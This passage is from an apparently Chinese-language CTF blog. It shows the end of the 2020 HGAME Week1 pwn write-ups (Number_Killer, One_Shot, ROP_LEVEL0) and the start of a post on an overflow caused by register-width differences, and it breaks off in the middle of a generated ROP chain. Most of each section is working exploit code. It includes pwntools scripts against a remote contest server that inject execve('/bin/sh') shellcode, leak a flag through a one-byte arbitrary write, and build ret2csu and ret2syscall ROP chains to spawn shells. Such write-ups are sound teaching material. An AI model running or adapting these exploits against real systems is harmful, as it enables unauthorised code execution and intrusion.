fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:0000000000400761 loc_400761:                             ; CODE XREF: main+8A↓j</span><br><span class="line">.text:0000000000400761                 mov     eax, 0</span><br><span class="line">.text:0000000000400766                 call    readll</span><br><span class="line">.text:000000000040076B                 mov     rdx, rax</span><br><span class="line">.text:000000000040076E                 mov     eax, [rbp+var_4]</span><br><span class="line">.text:0000000000400771                 cdqe</span><br><span class="line">.text:0000000000400773                 mov     [rbp+rax*8+var_60], rdx</span><br><span class="line">.text:0000000000400778                 add     [rbp+var_4], 1</span><br><span class="line">.text:000000000040077C</span><br><span class="line">.text:000000000040077C loc_40077C:                             ; CODE XREF: main+69↑j</span><br><span class="line">.text:000000000040077C                 cmp     [rbp+var_4], 13h</span><br><span class="line">.text:0000000000400780                 jle     short loc_400761</span><br><span class="line">.text:0000000000400782                 mov     eax, 0</span><br><span class="line">.text:0000000000400787                 leave</span><br><span class="line">.text:0000000000400788                 retn</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-0000000000000060 var_60          dq 11 dup(?)            ;输入</span><br><span class="line">-0000000000000008                 db ? ; undefined</span><br><span class="line">-0000000000000007                 db ? ; undefined</span><br><span class="line">-0000000000000006                 db ? ; undefined</span><br><span class="line">-0000000000000005                 db ? ; undefined</span><br><span class="line">-0000000000000004 var_4           dd ?                    ;循环数</span><br><span class="line">+0000000000000000  s              db 8 dup(?)</span><br><span class="line">+0000000000000008  r              db 8 dup(?)</span><br><span class="line">+0000000000000010</span><br><span class="line">+0000000000000010 ; end of stack variables</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:0000000000400789 gift            proc near</span><br><span class="line">.text:0000000000400789 ; __unwind &#123;</span><br><span class="line">.text:0000000000400789                 push    rbp</span><br><span class="line">.text:000000000040078A                 mov     rbp, rsp</span><br><span class="line">.text:000000000040078D                 jmp     rsp</span><br><span class="line">.text:000000000040078D gift            endp</span><br></pre></td></tr></table></figure></div><p>栈溢出覆盖后可修改循环数，但如果想修改ret，就必须改为 c00000000 。</p><p>ret到gift上后jmp rsp跳转到ret下一地址，在ret后还有6次循环，足够我们shellcode实现ret2shellcode</p><p>但shellcode一次只能输入20位数字，因此payload需要截断</p><p>但我刚好找到了可以直接手写的shellcode</p><p>直接看exp吧</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process('./Number_Killer')</span></span><br><span class="line">p=remote(<span class="string">'47.103.214.163'</span>, <span class="number">20001</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Let\'s Pwn me with numbers!'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">12</span>):</span><br><span class="line">    p.sendline(<span class="string">'51539607552'</span>) <span class="comment">#c 0000 0000</span></span><br><span class="line">p.sendline(<span class="string">'4196237'</span>) <span class="comment"># gift</span></span><br><span class="line"><span class="comment">#gdb.attach(p,'break *0x400773')</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">    .global _start</span></span><br><span class="line"><span class="string">_start:</span></span><br><span class="line"><span class="string">    # char *const argv[]</span></span><br><span class="line"><span class="string">    xorl %esi, %esi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # 'h' 's' '/' '/' 'n' 'i' 'b' '/'</span></span><br><span class="line"><span class="string">    movq $0x68732f2f6e69622f, %rbx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # for '\x00'</span></span><br><span class="line"><span class="string">    pushq %rsi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    pushq %rbx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    pushq %rsp</span></span><br><span class="line"><span class="string">    # const char *filename</span></span><br><span class="line"><span class="string">    popq %rdi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # __NR_execve 59</span></span><br><span class="line"><span class="string">    pushq $59</span></span><br><span class="line"><span class="string">    popq %rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # char *const envp[]</span></span><br><span class="line"><span class="string">    xorl %edx, %edx</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment">#  char *shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56"</span></span><br><span class="line"><span class="comment">#    "\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05";</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'7955998173871797809'</span>)</span><br><span class="line">p.sendline(<span class="string">'6869206962231521071'</span>)</span><br><span class="line">p.sendline(<span class="string">'1424770328968042'</span>)</span><br><span class="line">p.sendline(<span class="string">'0'</span>)</span><br><span class="line">p.sendline(<span class="string">'0'</span>)</span><br><span class="line">p.sendline(<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h2 id="One-Shot"><a href="#One-Shot" class="headerlink" title="One_Shot"></a>One_Shot</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *v4; // [rsp+<span class="number">8</span>h] [rbp<span class="number">-18</span>h]</span><br><span class="line">  int fd[<span class="number">2</span>]; // [rsp+<span class="number">10</span>h] [rbp<span class="number">-10</span>h]</span><br><span class="line">  unsigned __int64 v6; // [rsp+<span class="number">18</span>h] [rbp<span class="number">-8</span>h]</span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v4 = <span class="number">0L</span>L;</span><br><span class="line">  *(_QWORD *)fd = open(<span class="string">"./flag"</span>, <span class="number">0</span>, envp);</span><br><span class="line">  setbuf(stdout, <span class="number">0L</span>L);</span><br><span class="line">  read(fd[<span class="number">0</span>], &amp;flag, <span class="number">0x1E</span>uLL);</span><br><span class="line">  puts(<span class="string">"Firstly....What's your name?"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%32s"</span>, &amp;name);</span><br><span class="line">  puts(<span class="string">"The thing that could change the world might be a Byte!"</span>);</span><br><span class="line">  puts(<span class="string">"Take tne only one shot!"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v4);</span><br><span class="line">  *v4 = <span class="number">1</span>;                    <span class="comment">################## 任意写1字节</span></span><br><span class="line">  puts(<span class="string">"A success?"</span>);</span><br><span class="line">  printf(<span class="string">"Goodbye,%s"</span>, &amp;name);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov     edi, offset aD  ; &quot;%d&quot;</span><br><span class="line">mov     eax, 0</span><br><span class="line">call    ___isoc99_scanf</span><br><span class="line">mov     rax, [rbp+var_18]</span><br><span class="line">mov     byte ptr [rax], 1                        ;  任意写一字节</span><br><span class="line">mov     edi, offset aASuccess ; &quot;A success?&quot;</span><br><span class="line">call    _puts</span><br><span class="line">mov     esi, offset name</span><br><span class="line">mov     edi, offset format ; &quot;Goodbye,%s&quot;</span><br></pre></td></tr></table></figure></div><p>查看bss段发现</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.bss:00000000006010C0 name            db    ? ;               ; DATA XREF: main+6C↑o</span><br><span class="line">.bss:00000000006010C0                                         ; main+BB↑o</span><br><span class="line">.bss:00000000006010C1                 db    ? ;</span><br><span class="line">.bss:00000000006010C2                 db    ? ;</span><br><span class="line">                            ...</span><br><span class="line">.bss:00000000006010DE                 db    ? ;</span><br><span class="line">.bss:00000000006010DF                 db    ? ;</span><br><span class="line">.bss:00000000006010E0                 public flag</span><br><span class="line">.bss:00000000006010E0 flag            db    ? ;               ; DATA XREF: main+56↑o</span><br><span class="line">.bss:00000000006010E1                 db    ? ;</span><br><span class="line">.bss:00000000006010E2                 db    ? ;</span><br><span class="line">                            ...</span><br></pre></td></tr></table></figure></div><p>因此如果将name的\n写为1就可以在后面printf时直接把flag泄露出来。</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process('./One_Shot')</span></span><br><span class="line">p=remote(<span class="string">'47.103.214.163'</span>, <span class="number">20002</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">32</span></span><br><span class="line">add=<span class="number">6295776</span></span><br><span class="line">p.recvuntil(<span class="string">'Firstly....What\'s your name?'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'Take tne only one shot!'</span>)</span><br><span class="line">p.sendline(str(add))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h2 id="ROP-LEVEL0"><a href="#ROP-LEVEL0" class="headerlink" title="ROP_LEVEL0"></a>ROP_LEVEL0</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> fd[<span class="number">2</span>]; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x38</span>uLL);</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  setbuf(_bss_start, <span class="number">0L</span>L);</span><br><span class="line">  v3 = <span class="built_in">open</span>(<span class="string">"./some_life_experience"</span>, <span class="number">0</span>);</span><br><span class="line">  *(_QWORD *)fd = v3;</span><br><span class="line">  <span class="built_in">read</span>(v3, &amp;buf, <span class="number">0x3C</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;buf);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>buf只有0x50，因此栈溢出，但开了NX，不能直接ret2shellcode</p><p>查看其他函数，发现 _libc_csu_init 因此尝试利用ret2csu  <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium-rop-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium-rop-zh/</a></p><p>直接套模板就好</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">sh = remote(<span class="string">'47.103.214.163'</span>,<span class="number">20003</span>)</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./ROP_LEVEL0'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">info(<span class="string">"puts_got = 0x%x"</span>,puts_got)</span><br><span class="line">pading=<span class="string">'A'</span>*<span class="number">0x58</span></span><br><span class="line">vul_addr = <span class="number">0x400636</span></span><br><span class="line">sh.recvuntil(<span class="string">'./flag'</span>)</span><br><span class="line">sh.sendline(pading+p64(vul_addr))</span><br><span class="line"></span><br><span class="line">csu_front_addr=<span class="number">0x400730</span></span><br><span class="line">csu_end_addr = <span class="number">0x40074A</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x400753</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(rbx, rbp, r12, r13, r14, r15, last)</span>:</span></span><br><span class="line">    payload = <span class="string">'B'</span>*<span class="number">24</span></span><br><span class="line">    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += p64(last)*<span class="number">8</span></span><br><span class="line">    sh.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x0000000000400753 : pop rdi ; ret</span></span><br><span class="line"><span class="comment">#0x0000000000400751 : pop rsi ; pop r15 ; ret</span></span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, puts_got, puts_got, puts_got, puts_got, vul_addr)</span><br><span class="line">sh.recvline()</span><br><span class="line">puts_addr = u64(str(sh.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>))</span><br><span class="line">info(<span class="string">"leak puts_addr = 0x%x"</span>,puts_addr)</span><br><span class="line"></span><br><span class="line">obj = LibcSearcher(<span class="string">'puts'</span>,puts_addr)</span><br><span class="line">puts_offset= obj.dump(<span class="string">'puts'</span>)</span><br><span class="line">system_offset= obj.dump(<span class="string">'system'</span>)</span><br><span class="line">real_addres = puts_addr-puts_offset</span><br><span class="line">info(<span class="string">"leak libc_addr = 0x%x"</span>,real_addres)</span><br><span class="line"></span><br><span class="line">binsh_offset = obj.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">system = real_addres+system_offset</span><br><span class="line">binsh=real_addres+binsh_offset</span><br><span class="line">info(<span class="string">'leak system_addr = 0x%x'</span>,libc.sym[<span class="string">'system'</span>])</span><br><span class="line">info(<span class="string">'leak bin_sh_addr = 0x%x'</span>,libc.search(<span class="string">'/bin/sh'</span>).next())</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'A'</span>*<span class="number">24</span> + p64(pop_rdi_ret) +p64(binsh) + p64(system)</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;2020HGAME-Week1-Pwn-WP&quot;&gt;&lt;a href=&quot;#2020HGAME-Week1-Pwn-WP&quot; class=&quot;headerlink&quot; title=&quot;2020HGAME Week1 Pwn WP&quot;&gt;&lt;/a&gt;2020HGAME Week1 Pwn</summary>
        
      
    
    
    
    <category term="Pwn" scheme="https://kabeor.github.io/categories/Pwn/"/>
    
    
    <category term="Pwn" scheme="https://kabeor.github.io/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>由寄存器位数差异引发的漏洞利用</title>
    <link href="https://kabeor.github.io/%E7%94%B1%E5%AF%84%E5%AD%98%E5%99%A8%E4%BD%8D%E6%95%B0%E5%B7%AE%E5%BC%82%E5%BC%95%E5%8F%91%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <id>https://kabeor.github.io/%E7%94%B1%E5%AF%84%E5%AD%98%E5%99%A8%E4%BD%8D%E6%95%B0%E5%B7%AE%E5%BC%82%E5%BC%95%E5%8F%91%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</id>
    <published>2020-01-22T16:00:00.000Z</published>
    <updated>2020-03-16T04:37:53.244Z</updated>
    
    <content type="html"><![CDATA[<h1 id="由寄存器位数差异引发的漏洞利用"><a href="#由寄存器位数差异引发的漏洞利用" class="headerlink" title="由寄存器位数差异引发的漏洞利用"></a>由寄存器位数差异引发的漏洞利用</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">|63..32|31..16|15-8|7-0|</span><br><span class="line">               |AH.|AL.|</span><br><span class="line">               |AX.....|</span><br><span class="line">       |EAX............|</span><br><span class="line">|RAX...................|</span><br></pre></td></tr></table></figure></div><p>以上是16，32，64位寄存器的大小。</p><h2 id="安全检查"><a href="#安全检查" class="headerlink" title="安全检查"></a>安全检查</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure></div><h2 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h2><p><a href="https://i.loli.net/2020/01/22/6Valx7X2EGHNjkP.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2020/01/22/6Valx7X2EGHNjkP.png" class="lazyload"></a></p><p>可见有一处花指令，先nop掉看逻辑</p><p><a href="https://i.loli.net/2020/01/22/rzQfUy2hLDvg4cW.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2020/01/22/rzQfUy2hLDvg4cW.png" class="lazyload"></a></p><p><a href="https://i.loli.net/2020/01/22/bYUqvVg1PS4ljtf.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2020/01/22/bYUqvVg1PS4ljtf.png" class="lazyload"></a></p><p>要求输入小于等于10也就是0xA，否则程序退出。</p><p>查看汇编</p><p><a href="https://i.loli.net/2020/01/22/k5XR6yrBUa2Anih.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2020/01/22/k5XR6yrBUa2Anih.png" class="lazyload"></a></p><p>可以发现</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eax               0000 000a</span><br><span class="line">rax     0000 0000 0000 000a</span><br><span class="line">rax     0000 0001 0000 000a    构造成这样也可以通过</span><br></pre></td></tr></table></figure></div><p>cmp指令的隐含操作为 op1-op2判断是否等于0。因此可触发类似整数溢出的漏洞。</p><p>于是如果我们构造 0x1 0000 0009 - 0xa 就会将eax内容变为 0xffff ffff，从而在后面的read name可以读大量字节，造成栈溢出。</p><p>使用file命令查看发现程序为静态链接</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ELF 64-bit LSB executable, x86-64, version 1 (GNU&#x2F;Linux), statically linked, for GNU&#x2F;Linux 2.6.32, BuildID[sha1]&#x3D;c69a6b123774b6c538eb99551edd57bc703c32f9, not stripped</span><br></pre></td></tr></table></figure></div><p>且程序内有syscall，因此直接使用ret2syscall进行ROP。</p><p>对于这道题来说，即可以手工构造给syscall传参，也可以使用 ROPgadget直接生成利用链</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary intoverflow --ropchain</span><br></pre></td></tr></table></figure></div><p>直接生成如下</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ROP chain generation</span><br><span class="line">===========================================================</span><br><span class="line"></span><br><span class="line">- Step <span class="number">1</span> -- Write-what-where gadgets</span><br><span class="line"></span><br><span class="line">[+] Gadget found: <span class="number">0x47c601</span> mov qword ptr [rsi], rax ; ret</span><br><span class="line">[+] Gadget found: <span class="number">0x4017b7</span> pop rsi ; ret</span><br><span class="line">[+] Gadget found: <span class="number">0x480956</span> pop rax ; pop rdx ; pop rbx ; ret</span><br><span class="line">[+] Gadget found: <span class="number">0x42660f</span> xor rax, rax ; ret</span><br><span class="line"></span><br><span class="line">- Step <span class="number">2</span> -- Init syscall number gadgets</span><br><span class="line"></span><br><span class="line">[+] Gadget found: <span class="number">0x42660f</span> xor rax, rax ; ret</span><br><span class="line">[+] Gadget found: <span class="number">0x46ea20</span> add rax, <span class="number">1</span> ; ret</span><br><span class="line">[+] Gadget found: <span class="number">0x46ea21</span> add eax, <span class="number">1</span> ; ret</span><br><span class="line"></span><br><span class="line">- Step <span class="number">3</span> -- Init syscall arguments gadgets</span><br><span class="line"></span><br><span class="line">[+] Gadget found: <span class="number">0x401696</span> pop rdi ; ret</span><br><span class="line">[+] Gadget found: <span class="number">0x4017b7</span> pop rsi ; ret</span><br><span class="line">[+] Gadget found: <span class="number">0x442e46</span> pop rdx ; ret</span><br><span class="line"></span><br><span class="line">- Step <span class="number">4</span> -- Syscall gadget</span><br><span class="line"></span><br><span class="line">[+] Gadget found: <span class="number">0x4003da</span> syscall</span><br><span class="line"></span><br><span class="line">- Step <span class="number">5</span> -- Build the ROP chain</span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># execve generated by ROPgadget</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">p = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000004017b7</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000006ca080</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000480956</span>) <span class="comment"># pop rax ; pop rdx ; pop rbx ; ret</span></span><br><span class="line">p += <span class="string">'/bin//sh'</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x4141414141414141</span>) <span class="comment"># padding</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x4141414141414141</span>) <span class="comment"># padding</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000047c601</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000004017b7</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000006ca088</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000042660f</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000047c601</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000401696</span>) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000006ca080</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000004017b7</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000006ca088</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000442e46</span>) <span class="comment"># pop rdx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000006ca088</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000042660f</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046ea20</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span 